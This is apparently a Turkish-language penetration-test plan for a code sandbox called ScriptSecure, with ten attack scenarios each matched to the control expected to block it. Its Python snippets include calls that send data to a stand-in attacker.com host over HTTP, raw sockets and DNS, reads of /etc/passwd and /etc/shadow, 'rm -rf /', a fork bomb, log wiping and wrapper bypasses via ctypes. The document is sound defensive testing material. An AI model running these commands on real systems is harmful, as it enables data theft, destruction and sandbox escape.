# ScriptSecure Güvenlik Denetimi ve Penetrasyon Test Senaryoları

## Genel Bakış

Bu belge, ScriptSecure sisteminin güvenlik denetimi için hazırlanmış gerçekçi saldırı senaryolarını içerir. Her senaryo, sistemin güvenlik kontrollerini test etmek ve potansiyel zafiyetleri tespit etmek amacıyla tasarlanmıştır.

---

## Senaryo 1: Dosya Sistemi Erişim Bypass Denemesi

### Saldırı Hedefi
Sistem dosyalarına (örn. `/etc/passwd`, `/etc/shadow`) erişim sağlayarak hassas bilgileri okumak.

### Saldırı Yöntemi
```python
# Senaryo 1.1: Doğrudan erişim denemesi
open('/etc/passwd', 'r')

# Senaryo 1.2: Path traversal ile bypass denemesi
open('../../etc/passwd', 'r')
open('/tmp/../../../etc/passwd', 'r')

# Senaryo 1.3: URL encoding ile bypass denemesi
open('/etc/%70asswd', 'r')  # %70 = 'p'
open('/etc/./passwd', 'r')

# Senaryo 1.4: Symlink saldırısı
import os
os.symlink('/etc/passwd', '/tmp/legitimate_file')
open('/tmp/legitimate_file', 'r')
```

### Beklenen Sistem Davranışı
- **Tüm denemeler REDDEDİLMELİDİR**
- Yetkilendirme motoru `/etc` dizinini yasaklı yol olarak tanımalı
- Path traversal kontrolü `../../` gibi desenleri tespit etmeli
- Symlink saldırıları, dosya yolunun normalize edilmesi ile engellenmeli

### Güvenlik Kontrolü
- **Politika:** `Policies/policy.json` → `file_system.forbidden_paths` listesi
- **Kod:** `secure/access_control_rules.py` → `check_path_traversal()` ve `check_path_rule()`
- **Motor:** `secure/engine.py` → `_evaluate_file_access()` metodu

### Test Sonucu Beklentisi
**BAŞARILI KORUMA:** Tüm erişim denemeleri `PermissionError` ile engellenmeli ve loglanmalı.

---

## Senaryo 2: Ağ Erişimi ve Veri Sızıntısı Denemesi

### Saldırı Hedefi
Sandbox dışına veri göndermek veya dış kaynaklardan veri çekmek.

### Saldırı Yöntemi
```python
# Senaryo 2.1: HTTP/HTTPS bağlantısı
import urllib.request
urllib.request.urlopen('http://attacker.com/exfiltrate?data=secret')

# Senaryo 2.2: Socket ile raw bağlantı
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
s.send(b'stolen_data')

# Senaryo 2.3: DNS sorgusu ile veri sızıntısı
import socket
socket.gethostbyname('secret-data.attacker.com')

# Senaryo 2.4: Localhost bypass denemesi
import socket
s = socket.socket()
s.connect(('127.0.0.1', 8080))
```

### Beklenen Sistem Davranışı
- **Tüm ağ erişimleri REDDEDİLMELİDİR**
- Container seviyesinde `network_disabled=True` ile ağ tamamen kapatılmalı
- Seccomp profili `socket`, `connect`, `bind` syscall'larını engellemeli
- Wrapper seviyesinde `socket` modülüne erişim engellenmeli

### Güvenlik Kontrolü
- **Container:** `pool_manager_final.py` → `network_disabled=True`
- **Politika:** `Policies/policy.json` → `network.default: "DENY"`
- **Seccomp:** `seccomp_profile.json` → `socket`, `connect` syscall'ları yok
- **Wrapper:** `src/wrappers/python_wrapper.py` → `socket` modülü sarmalanmalı

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Tüm ağ erişim denemeleri engellenmeli (network disabled + seccomp + wrapper).

---

## Senaryo 3: Komut Injection ve Sistem Komut Çalıştırma

### Saldırı Hedefi
Sistem komutlarını çalıştırarak sandbox dışına çıkmak veya sistem kaynaklarına erişmek.

### Saldırı Yöntemi
```python
# Senaryo 3.1: os.system ile komut çalıştırma
import os
os.system('cat /etc/passwd')
os.system('rm -rf /')

# Senaryo 3.2: Command injection
os.system('echo hello; cat /etc/shadow')
os.system('ls && whoami')
os.system('ls | grep passwd')

# Senaryo 3.3: subprocess ile bypass denemesi
import subprocess
subprocess.call(['/bin/sh', '-c', 'cat /etc/passwd'])
subprocess.Popen(['ls', '-la', '/etc'])

# Senaryo 3.4: eval/exec ile kod çalıştırma
eval("__import__('os').system('whoami')")
exec("import os; os.system('id')")
```

### Beklenen Sistem Davranışı
- **Tüm komut çalıştırma denemeleri REDDEDİLMELİDİR**
- `os.system` wrapper tarafından yakalanmalı ve engellenmeli
- Command injection karakterleri (`;`, `|`, `&`, vb.) tespit edilmeli
- `subprocess`, `eval`, `exec` gibi modüller wrapper tarafından engellenmeli

### Güvenlik Kontrolü
- **Politika:** `Policies/policy.json` → `process.default: "DENY"`
- **Kod:** `secure/access_control_rules.py` → `check_command_injection()`
- **Wrapper:** `src/wrappers/python_wrapper.py` → `secure_os_system()` metodu
- **Seccomp:** `seccomp_profile.json` → `execve` kontrolü

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Tüm komut çalıştırma denemeleri engellenmeli ve loglanmalı.

---

## Senaryo 4: Privilege Escalation ve Capability Abuse

### Saldırı Hedefi
Container içinde yükseltilmiş yetkiler elde ederek sistem kaynaklarına erişmek.

### Saldırı Yöntemi
```python
# Senaryo 4.1: setuid/setgid denemesi
import os
os.setuid(0)  # Root olmaya çalış
os.setgid(0)

# Senaryo 4.2: Capability kullanımı
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.setuid(0)

# Senaryo 4.3: /proc/self/exe ile binary değiştirme
import os
os.execve('/bin/sh', ['/bin/sh'], {})

# Senaryo 4.4: ptrace ile process manipulation
import ptrace
```

### Beklenen Sistem Davranışı
- **Tüm privilege escalation denemeleri REDDEDİLMELİDİR**
- Container `cap_drop=["ALL"]` ile tüm capabilities düşürülmeli
- Seccomp profili `setuid`, `setgid`, `ptrace` syscall'larını engellemeli
- `/proc` dizinine erişim engellenmeli

### Güvenlik Kontrolü
- **Container:** `pool_manager_final.py` → `cap_drop=["ALL"]`
- **Politika:** `Policies/policy.json` → `capabilities.forbidden_capabilities`
- **Seccomp:** `seccomp_profile.json` → `setuid`, `setgid` syscall'ları yok
- **Path:** `/proc` yasaklı yol listesinde

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Tüm privilege escalation denemeleri syscall seviyesinde engellenmeli.

---

## Senaryo 5: Sandbox Escape - Container Kaçış Denemesi

### Saldırı Hedefi
Container'dan çıkarak host sistemine erişim sağlamak.

### Saldırı Yöntemi
```python
# Senaryo 5.1: Docker socket erişimi
open('/var/run/docker.sock', 'r')
# Docker API üzerinden yeni container oluşturma

# Senaryo 5.2: Host filesystem mount erişimi
open('/host/etc/passwd', 'r')  # Eğer mount edilmişse

# Senaryo 5.3: Kernel modül yükleme
# CAP_SYS_MODULE ile kernel modülü yükleme

# Senaryo 5.4: cgroups manipulation
open('/sys/fs/cgroup/memory/current', 'w')
```

### Beklenen Sistem Davranışı
- **Tüm sandbox escape denemeleri REDDEDİLMELİDİR**
- Docker socket'e erişim engellenmeli (volume mount yok)
- Host filesystem'e erişim engellenmeli
- Kernel modül yükleme capabilities ile engellenmeli
- `/sys` dizinine erişim engellenmeli

### Güvenlik Kontrolü
- **Container:** `pool_manager_final.py` → Sadece gerekli volume'lar mount edilmeli
- **Politika:** `Policies/policy.json` → `file_system.forbidden_paths` → `/sys`, `/var/run`
- **Capabilities:** Tüm capabilities düşürülmeli
- **Seccomp:** Kernel modül yükleme syscall'ları engellenmeli

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Container izolasyonu korunmalı, host sistemine erişim engellenmeli.

---

## Senaryo 6: Kaynak Tüketimi (DoS) Saldırıları

### Saldırı Hedefi
Sistem kaynaklarını tüketerek servisi durdurmak.

### Saldırı Yöntemi
```python
# Senaryo 6.1: Fork bomb
import os
while True:
    os.fork()

# Senaryo 6.2: Bellek tüketimi
data = 'x' * (100 * 1024 * 1024)  # 100MB
# Sonsuz döngü ile bellek tüketimi

# Senaryo 6.3: CPU tüketimi
while True:
    pass  # CPU %100 kullanımı

# Senaryo 6.4: Dosya descriptor tüketimi
files = []
for i in range(10000):
    files.append(open(f'/tmp/file_{i}', 'w'))
```

### Beklenen Sistem Davranışı
- **Kaynak limitleri uygulanmalıdır**
- `pids_limit=15` ile fork bomb engellenmeli
- `mem_limit="64m"` ile bellek tüketimi sınırlandırılmalı
- CPU throttling uygulanmalı
- Dosya descriptor limiti uygulanmalı

### Güvenlik Kontrolü
- **Container:** `pool_manager_final.py` → `pids_limit=15`, `mem_limit="64m"`
- **Politika:** `Policies/policy.json` → `resource_limits` bölümü
- **Seccomp:** `clone`, `fork` syscall'ları kontrol edilmeli

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Kaynak limitleri uygulanmalı, container OOM (Out of Memory) ile sonlandırılmalı veya throttling uygulanmalı.

---

## Senaryo 7: Policy Bypass ve Misconfiguration Abuse

### Saldırı Hedefi
Güvenlik politikasındaki yanlış yapılandırmaları kötüye kullanmak.

### Saldırı Yöntemi
```python
# Senaryo 7.1: İzin verilen yol içinde tehlikeli işlem
# Eğer /tmp izinliyse:
open('/tmp/../../etc/passwd', 'w')  # Path traversal ile bypass

# Senaryo 7.2: İzin verilen uzantı içinde script
open('/tmp/script.txt', 'w')
# İçine Python kodu yaz, sonra exec et

# Senaryo 7.3: Case sensitivity bypass
open('/TMP/evil', 'w')  # Eğer case-sensitive değilse

# Senaryo 7.4: Unicode normalization bypass
open('/tmp/\u200Bevil', 'w')  # Görünmez karakterler
```

### Beklenen Sistem Davranışı
- **Tüm bypass denemeleri tespit edilmeli ve engellenmelidir**
- Path normalization doğru çalışmalı
- Unicode ve case sensitivity kontrolü yapılmalı
- Dosya içeriği kontrolü (eğer gerekirse) yapılmalı

### Güvenlik Kontrolü
- **Kod:** `secure/access_control_rules.py` → `check_path_traversal()`, path normalization
- **Motor:** `secure/engine.py` → `_evaluate_file_access()` → mutlak yol kontrolü
- **Politika:** `Policies/policy.json` → `forbidden_patterns` kontrolü

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Policy bypass denemeleri tespit edilmeli ve engellenmeli.

---

## Senaryo 8: Log Manipulation ve Audit Trail Bypass

### Saldırı Hedefi
Güvenlik loglarını manipüle ederek saldırı izlerini silmek.

### Saldırı Yöntemi
```python
# Senaryo 8.1: Log dosyasını silme
import os
os.remove('/tmp/access.log')

# Senaryo 8.2: Log dosyasını üzerine yazma
open('/tmp/access.log', 'w').write('')

# Senaryo 8.3: Log dosyasını taşıma
import os
os.rename('/tmp/access.log', '/tmp/hidden.log')
```

### Beklenen Sistem Davranışı
- **Log dosyası korunmalıdır**
- Log dosyasına yazma sadece append modunda olmalı
- Log dosyasını silme/taşıma engellenmeli
- Log dosyası read-only olarak mount edilebilir

### Güvenlik Kontrolü
- **Politika:** `Policies/policy.json` → Log dosyası için özel kural
- **Wrapper:** Log yazma sadece append modunda olmalı
- **Container:** Log dosyası read-only volume olarak mount edilebilir

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Log manipülasyon denemeleri engellenmeli, audit trail korunmalı.

---

## Senaryo 9: Time-of-Check-Time-of-Use (TOCTOU) Saldırısı

### Saldırı Hedefi
Dosya erişim kontrolü ile gerçek erişim arasındaki zaman farkını kötüye kullanmak.

### Saldırı Yöntemi
```python
# Senaryo 9.1: Race condition
import threading
import time

def change_symlink():
    time.sleep(0.1)
    os.remove('/tmp/target')
    os.symlink('/etc/passwd', '/tmp/target')

threading.Thread(target=change_symlink).start()
open('/tmp/target', 'r')  # Kontrol sırasında izinli, erişim sırasında /etc/passwd
```

### Beklenen Sistem Davranışı
- **TOCTOU saldırıları tespit edilmeli ve engellenmelidir**
- Dosya yolu normalize edilmeli ve kontrol edilmeli
- Symlink takibi yapılmalı
- Dosya erişimi sırasında tekrar kontrol yapılmalı (eğer mümkünse)

### Güvenlik Kontrolü
- **Kod:** `secure/engine.py` → Path normalization ve symlink kontrolü
- **Wrapper:** Dosya açma sırasında gerçek yol kontrolü

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** TOCTOU saldırıları tespit edilmeli ve engellenmeli.

---

## Senaryo 10: Wrapper Bypass - Doğrudan Sistem Çağrıları

### Saldırı Hedefi
Wrapper'ları atlayarak doğrudan sistem çağrılarına erişmek.

### Saldırı Yöntemi
```python
# Senaryo 10.1: __builtins__ manipülasyonu
__builtins__.__dict__['open'] = __builtins__.__dict__['open']
# Wrapper'ı atlayarak orijinal open'a erişim

# Senaryo 10.2: ctypes ile doğrudan syscall
import ctypes
libc = ctypes.CDLL('libc.so.6')
fd = libc.open(b'/etc/passwd', 0)  # O_RDONLY

# Senaryo 10.3: ffi ile doğrudan erişim
from cffi import FFI
ffi = FFI()
ffi.cdef("int open(const char *pathname, int flags);")
lib = ffi.dlopen("libc.so.6")
lib.open(b'/etc/passwd', 0)
```

### Beklenen Sistem Davranışı
- **Wrapper bypass denemeleri engellenmelidir**
- Seccomp profili seviyesinde syscall kontrolü yapılmalı
- `open` syscall'ı kontrol edilmeli
- Container seviyesinde read-only filesystem uygulanmalı

### Güvenlik Kontrolü
- **Seccomp:** `seccomp_profile.json` → `open` syscall'ı yok, sadece `openat` var (kontrol edilebilir)
- **Container:** `pool_manager_final.py` → `read_only=True`
- **Wrapper:** `__builtins__` manipülasyonu tespit edilmeli

### Test Sonucu Beklentisi
✅ **BAŞARILI KORUMA:** Wrapper bypass denemeleri seccomp seviyesinde engellenmeli.

---

## Test Metodolojisi

### Otomatik Test Senaryoları
Her senaryo için otomatik test scriptleri oluşturulmalı ve CI/CD pipeline'ına entegre edilmelidir.

### Manuel Test Senaryoları
Kritik senaryolar manuel olarak da test edilmeli ve sonuçlar dokümante edilmelidir.

### Sürekli İyileştirme
Yeni saldırı vektörleri keşfedildikçe, bu senaryolar güncellenmeli ve test edilmelidir.

---

## Sonuç

Bu penetrasyon test senaryoları, ScriptSecure sisteminin güvenlik kontrollerini kapsamlı bir şekilde test etmek için tasarlanmıştır. Her senaryo, gerçek dünyada karşılaşılabilecek saldırı vektörlerini simüle eder ve sistemin bu saldırılara karşı dayanıklılığını ölçer.